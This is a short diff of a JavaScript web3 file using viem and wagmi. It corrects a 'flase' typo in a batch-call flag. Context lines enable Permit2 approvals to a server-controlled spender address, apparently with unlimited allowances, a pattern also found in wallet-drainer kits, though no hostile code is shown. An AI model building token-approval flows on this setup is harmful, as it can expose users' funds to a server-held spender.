@@ -5,7 +5,7 @@ import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunct
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance, signTypedData } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = flase; // Поставьте false для отключения batch-операций
+const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
 // === Флаг для включения Permit2 вместо single approve ===
 const USE_PERMIT2 = true; // true => использовать Permit2, false => обычный single approve
 // Адрес spender для Permit2 (должен быть EOA сервера, который подпишет tx на Permit2)
